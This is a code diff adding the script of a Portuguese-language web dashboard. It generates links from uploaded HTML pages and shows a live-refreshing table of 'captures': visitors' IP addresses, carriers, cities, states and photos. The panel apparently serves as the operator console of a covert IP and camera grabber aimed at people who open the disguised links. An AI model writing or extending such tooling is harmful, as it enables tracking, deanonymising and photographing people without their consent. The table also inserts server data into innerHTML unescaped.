+    $('reset-btn').addEventListener('click', () => { applyState({ name: 'Meu painel', ft: currentFt, photo: '', theme: THEMES[0].name, bg: THEMES[0].bg, accent: THEMES[0].accent, font: 100, density: 'comfortable', autoSave: true, animations: true, contrast: false, notifications: true }); $('photo-input').value = ''; $('toast').textContent = 'Configurações restauradas para o padrão.'; });
+    document.querySelectorAll('.nav-btn').forEach(btn => btn.addEventListener('click', () => { document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); document.querySelectorAll('.section').forEach(s => s.classList.remove('active')); btn.classList.add('active'); $(btn.dataset.target).classList.add('active'); $('page-title').textContent = btn.textContent.trim(); }));
+    try { const saved = JSON.parse(localStorage.getItem('orbitPanelSettings')); applyState(saved || {}); } catch { applyState({}); }
+
+    // --- LÓGICA DO GERADOR E TABELA ---
+    $('btn-gerar').addEventListener('click', async () => {
+      const tipo = $('tipo-link').value;
+      const nome = $('ft-nome').value;
+      const arquivo = $('ft-html').files[0];
+
+      if (!nome) { alert("Digite o nome da FT."); return; }
+      if (!arquivo) { alert("Escolha o arquivo HTML."); return; }
+
+      const formData = new FormData();
+      formData.append('tipo', tipo);
+      formData.append('nome_ft', nome);
+      formData.append('arquivo_html', arquivo);
+
+      $('btn-gerar').textContent = "Gerando...";
+      
+      try {
+        const res = await fetch('/api/gerar_link', { method: 'POST', body: formData });
+        const dados = await res.json();
+
+        if (dados.sucesso) {
+          $('link-gerado').value = dados.link;
+          $('link-gerado-box').style.display = 'block';
+          $('ft-nome').value = '';
+          $('ft-html').value = '';
+          carregarIPs();
+        } else {
+          alert(dados.erro);
+        }
+      } catch (err) {
+        alert("Erro no servidor.");
+      }
+      $('btn-gerar').textContent = "Gerar Link";
+    });
+
+    async function carregarIPs() {
+      try {
+        const res = await fetch('/api/puxar_ips');
+        const dados = await res.json();
+        const tabela = $('tabela-ips');
+        tabela.innerHTML = '';
+
+        if (dados.length === 0) {
+          tabela.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:20px; color:#aaa;">Nenhuma captura ainda.</td></tr>';
+          return;
+        }
+
+        dados.forEach(item => {
+          const tr = document.createElement('tr');
+          
+          let imgTag = '<span style="color:#aaa; font-size:0.7rem;">Sem Foto</span>';
+          if (item.foto && item.foto !== 'pendente.jpg' && item.foto !== 'nao_tem.jpg') {
+            imgTag = `<img src="/fotos/${item.foto}?t=${Date.now()}" class="img-ft">`;
+          } else if (item.foto === 'pendente.jpg') {
+            imgTag = '<span style="color:#f59e0b; font-size:0.7rem;">⏳ Aguardando...</span>';
+          }
+
+          tr.innerHTML = `
+            <td>${imgTag}</td>
+            <td>
+              <div class="ip-text">${item.ip}</div>
+              <div class="operadora-text">${item.operadora || 'Desconhecida'}</div>
+            </td>
+            <td>${item.cidade} - ${item.estado}</td>
+            <td><span style="background: rgba(139,92,246,0.2); padding: 4px 8px; border-radius: 6px; font-size: 0.75rem;">${item.ft}</span></td>
+            <td style="color: #aaa;">${item.data}</td>
+          `;
+          tabela.appendChild(tr);
+        });
+      } catch (e) {}
+    }
+
+    // Atualiza a tabela a cada 4 segundos
+    setInterval(carregarIPs, 4000);
+  </script>
+</body>
+                                 </html>
